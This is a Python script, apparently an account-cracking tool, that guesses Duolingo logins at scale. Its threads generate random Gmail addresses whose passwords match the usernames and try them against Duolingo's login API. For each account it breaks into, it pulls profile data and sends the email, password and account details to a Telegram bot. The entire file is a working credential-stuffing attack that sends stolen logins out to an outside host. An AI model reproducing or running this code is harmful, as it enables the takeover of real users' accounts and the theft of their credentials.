import requests
import json
import uuid
from threading import Thread
import webbrowser
import random
import os
from faker import Faker
import names
import telebot
#=====================
R='\033[1;31m'#لون احمر
G='\033[1;32m'#لون اخضر
Y='\033[1;33m'#لون اصفر
B='\033[1;34m'#لون ازرك
M='\033[1;35m'#لون بنفسجي
C='\033[1;36m'#لون سمائي
W='\033[1;37m'#لون ابيض
#=====================
webbrowser.open('https://t.me/HA404N')
token =input('Token : ')
id =input('ID : ')
os.system('clear')
bot =telebot.TeleBot(token)
#=======================================
fk =Faker()
g=0
b=0
e=0
xp0999=0
level10100=0
#=======================================

def gett(idd, tok):		
	url = f"https://android-api-cf.duolingo.com/2023-05-23/users/{idd}?fields=adsConfig%7Bunits%7D%2Cid%2CbetaStatus%2CblockerUserIds%2CblockedUserIds%2CclassroomLeaderboardsEnabled%2Ccourses%7Bid%2Csubject%2Cxp%2CfromLanguage%2ClearningLanguage%2CauthorId%7Bvalue%7D%2CalphabetsPathProgressKey%2Ctopic%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailResearch%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2CinviteURL%2CemailUniversalPractice%2CpushUniversalPractice%2CjoinedClassroomIds%2ClastResurrectionTimestamp%2ClearningLanguage%2Cname%2CfirstName%2ClastName%2CobservedClassroomIds%2CoptionalFeatures%7Bid%7Bvalue%7D%2Cstatus%7D%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BdiscountType%2CisActivated%2CexpirationEpochTime%2CsecondsUntilExpiration%7D%2CprivacySettings%2CpushAnnouncement%2CpushEarlyBird%2CpushFamilyPlanNudge%2CpushFriendStreakNudge%2CpushFriendsQuestNudge%2CpushNightOwl%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CpushSchoolsAssignment%2ClssEnabled%2CdeanonymizedSpeechShareEnabled%2CrequiresSsoLogin%2CrewardBundles%7Bid%7Bvalue%7D%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2Camount%2CitemId%2Ccurrency%2CeligibleThreshold%2CrewardType%2Citems%7BitemType%2Camount%7D%2Cweight%2CisAdReward%2Ccategory%2Citem_id%2Cbias%2Cunowned_bias%2CrarityProbabilities%2Cshards%7Bid%2Citem_id%2Crarity%2Cconsumed%7D%7D%7D%2Croles%2CshakeToReportEnabled%2CshouldForceConnectPhoneNumber%2CshouldPreventMonetizationForSchoolsUser%2CsmsAll%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2Cquantity%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2CproductId%2Crenewer%2Crenewing%2CvendorPurchaseId%2CexpectedExpirationMs%7D%2CexpectedExpirationDate%2CpurchaseId%2CpurchasedByUserId%2CremainingEffectDurationInSeconds%2CxpBoostMultiplier%2CexpirationEpochTime%2CfamilyPlanInfo%7BownerId%2CsecondaryMembers%2CinviteToken%2CpendingInvites%7BfromUserId%2CtoUserId%2Cstatus%2CsubscriptionItemType%2CsentTime%7D%2CupgradeNudge%7BreceiverId%2CsenderId%2CeventTimestamp%2Ctracking%7D%7D%2Ccontext%7D%2Cstreak%2CstreakData%7Blength%2CstartTimestamp%2CupdatedTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2CsubscriptionConfigs%7BisInBillingRetryPeriod%2CisInGracePeriod%2CvendorPurchaseId%2CproductId%2CpauseStart%2CpauseEnd%2CreceiptSource%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2CuniversalPracticeNotifyTime%2Cusername%2CuseUniversalSmartReminderTime%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpGoal%2CzhTw%2CtimerBoostConfig%7BtimerBoosts%2CtimePerBoost%2ChasFreeTimerBoost%7D%2CenableSpeaker%2CchinaUserModerationRecords%7Brecord_identifier%2Cuser_id%2Crecord_type%2Ccontent%2Cdecision%2Csubmission_time%7D%2CsubscriberLevel%2CadRequestAgeGroup%2Cmotivation"	
	headers = {
	  'User-Agent': "Duodroid/6.91.4 Dalvik/2.1.0 (Linux; U; Android 14; TECNO LH7n Build/UP1A.231005.007)",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip",
	  'authorization': f"Bearer {tok}",
	}
	
	data = requests.get(url, headers=headers).json()	
	tracking = data.get("trackingProperties", {})
	
	user_id = data.get("id") or tracking.get("user_id")
	username = data.get("username") or tracking.get("username")
	total_xp = data.get("totalXp")
	streak = data.get("streak")
	gems = data.get("gems") or data.get("gemsConfig", {}).get("gems") or tracking.get("gems", 0)
	
	level = data.get("level", 0)
	learning_language = data.get("learningLanguage")
	ui_language = data.get("uiLanguage")
	creation_date = data.get("creationDate")
	
	return user_id, username, total_xp, streak, gems, level, learning_language, ui_language, creation_date

def login(email,password):
	global g, b, e, xp0999, level10100
	url = "https://android-api-cf.duolingo.com/2017-06-30/login?fields=id"	
	payload = {
	  "identifier": email,
	  "password": password,
	  "distinctId": str(uuid.uuid4()),
	}	
	headers = {
	  'User-Agent': "Duodroid/6.91.4 Dalvik/2.1.0 (Linux; U; Android 14; TECNO LH7n Build/UP1A.231005.007)",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip",
	  'Content-Type': "application/json",
	  'x-amzn-trace-id': "User=0"
	}
	try:
		response = requests.post(url, data=json.dumps(payload), headers=headers)
		res_json = response.json()
		
		if "id" in res_json:
			idd = res_json['id']
			tok = response.headers.get('jwt')
			
			idr, username, xp, streak, gems, level, lern, couid, creaid = gett(idd, tok)
			
			xp = int(xp) if str(xp).isdigit() else 0
			level = int(level) if str(level).isdigit() else 0
			
			g += 1
			os.system('clear')
			if xp >= 100:
				xp0999 += 1
			if level >= 10:
				level10100 += 1
			print(f'''\r	
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}
{R}~~~~~~~~~~~~~~~~~~~~{R}
{G}Hits : {Y}{g}
{R}Bad Hits : {Y}{b}
{M}Error : {Y}{e}
{W}~~~~~~~~~~~
xp 100>999 : {xp0999}
Level 10>100 : {level10100}
~~~~~~~~~~~
{R}Dev : @Al_Baron4
{R}~~~~~~~~~~~~~~~~~~~~{R}
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}	
		''', end='')
			
			bot.send_message(chat_id=id, text=f'''
_•_•_•_•_•_•_Doolingo_•_•_•_••_•_
~~~~~~~~~~~~~~~~~~~~
Email : {email}
Password : {password}
Username : {username}
ID : {idr}
Level : {level}
XP : {xp}
GEMS : {gems}
Created : {creaid}
~~~~~~~~~~~
DEV : @Al_Baron4
Ch : @HA404N
~~~~~~~~~~~~~~~~~~~~
_•_•_•_•_•_•_Doolingo_•_•_•_••_•_		
		''')
		else:
			b += 1
			os.system('clear')

			print(f'''\r	
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}
{R}~~~~~~~~~~~~~~~~~~~~{R}
{G}Hits : {Y}{g}
{R}Bad Hits : {Y}{b}
{M}Error : {Y}{e}
{W}~~~~~~~~~~~
xp 100>999 : {xp0999}
Level 10>100 : {level10100}
~~~~~~~~~~~
{R}Dev : @Al_Baron4
{R}~~~~~~~~~~~~~~~~~~~~{R}
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}	
		''', end='')

	except Exception as er:
		e += 1
		os.system('clear')
		print(f'''\r	
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}
{R}~~~~~~~~~~~~~~~~~~~~{R}
{G}Hits : {Y}{g}
{R}Bad Hits : {Y}{b}
{M}Error : {Y}{e}
{W}~~~~~~~~~~~
xp 100>999 : {xp0999}
Level 10>100 : {level10100}
~~~~~~~~~~~
{R}Dev : @Al_Baron4
{R}~~~~~~~~~~~~~~~~~~~~{R}
{Y}_•_•_•_•_•_•_Doolingo_•_•_•_••_•_{Y}	
		''', end='')	
		bot.send_message(chat_id=id,text=str(er))	
def get_us():
    while True:
        rn = random.choice([1, 2, 3])
        num = ''.join(random.choice('1234567890') for i in range(rn))
        us1 = fk.user_name()
        us2 = fk.first_name()
        username = random.choice([us1,us2])
        email = username +"@gmail.com"
        password=username     
        login(email, password)


for _ in range(5):
	Thread(target=get_us).start()
